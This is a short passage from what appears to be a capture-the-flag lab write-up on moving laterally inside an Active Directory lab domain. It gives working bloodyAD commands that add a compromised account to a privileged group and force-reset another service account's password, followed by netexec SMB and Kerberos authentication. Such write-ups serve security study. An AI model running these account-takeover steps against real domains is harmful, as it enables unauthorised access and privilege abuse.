## Auth as monitoring_svc
### Password Reset

```sh
# Add web_svc to IT_Support
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc

# Reset password (now should work)
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
```

![](<./attachments/04.1-Lateral Movement.png>)

### Kerberos Access

```sh
netexec smb DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. 
```

`sudo ntpdate DC01.nanocorp.htb`, and then adding `-k` fixes it: 

```sh
netexec smb DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k
```
